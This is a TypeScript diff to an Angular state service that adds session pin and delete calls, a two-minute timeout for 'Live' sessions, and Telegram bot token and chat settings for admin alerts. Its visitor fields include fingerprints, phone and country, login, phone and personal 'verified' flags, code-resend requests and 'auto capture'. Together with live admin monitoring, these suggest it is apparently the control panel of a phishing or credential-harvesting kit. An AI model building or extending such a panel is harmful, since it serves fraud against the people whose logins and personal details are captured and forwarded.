@@ -28,6 +28,7 @@ export interface SessionHistory {
   data: any;
   stage?: string;
   resendRequested?: boolean;
+  isPinned?: boolean;
   // Progress flags
   isLoginVerified?: boolean;
   isPhoneVerified?: boolean;
@@ -63,6 +64,8 @@ export class StateService {
 
   readonly adminAlertEmail = signal<string>('');
   readonly adminAutoCapture = signal<boolean>(true);
+  readonly telegramBotToken = signal<string>('');
+  readonly telegramChatId = signal<string>('');
   
   // Admin Session Monitoring
   readonly monitoredSessionId = signal<string | null>(null);
@@ -581,8 +584,15 @@ export class StateService {
     const rawActive = sessions.filter((s: any) => s.status !== 'Verified' && s.sessionId !== adminSessionId);
 
     const newActiveSessions: SessionHistory[] = [];
+    const TIMEOUT_MS = 2 * 60 * 1000; // 2 minutes timeout for "Live" status
+    const now = Date.now();
 
     for (const s of rawActive) {
+        // Timeout Filter
+        if (s.lastSeen && (now - s.lastSeen > TIMEOUT_MS)) {
+            continue;
+        }
+
         const id = s.sessionId;
         const cached = this.sessionCache.get(id);
 
@@ -600,6 +610,7 @@ export class StateService {
                 fingerprint: s.fingerprint,
                 data: s,
                 resendRequested: s.resendRequested,
+                isPinned: s.isPinned,
                 isLoginVerified: s.isLoginVerified,
                 isPhoneVerified: s.isPhoneVerified,
                 isPersonalVerified: s.isPersonalVerified,
@@ -651,6 +662,7 @@ export class StateService {
           name: `${s.firstName || ''} ${s.lastName || ''}`,
           status: s.status,
           fingerprint: s.fingerprint,
+          isPinned: s.isPinned,
           data: {
             phone: s.phoneNumber,
             country: s.country,
@@ -939,9 +951,31 @@ export class StateService {
       }
   }
 
-  updateAdminSettings(email: string, auto: boolean) {
+  async deleteSession(id: string) {
+      try {
+          await firstValueFrom(from(fetch(`/api/sessions/${id}`, { method: 'DELETE' })));
+          this.showAdminToast('Session Deleted');
+          this.fetchSessions();
+      } catch (e) {
+          this.showAdminToast('Failed to delete');
+      }
+  }
+
+  async pinSession(id: string) {
+      try {
+          await firstValueFrom(from(fetch(`/api/sessions/${id}/pin`, { method: 'POST' })));
+          this.showAdminToast('Session Updated');
+          this.fetchSessions();
+      } catch (e) {
+          this.showAdminToast('Failed to pin');
+      }
+  }
+
+  updateAdminSettings(email: string, auto: boolean, tgToken?: string, tgChat?: string) {
       this.adminAlertEmail.set(email);
       this.adminAutoCapture.set(auto);
+      if (tgToken !== undefined) this.telegramBotToken.set(tgToken);
+      if (tgChat !== undefined) this.telegramChatId.set(tgChat);
   }
 
   showAdminToast(msg: string) {
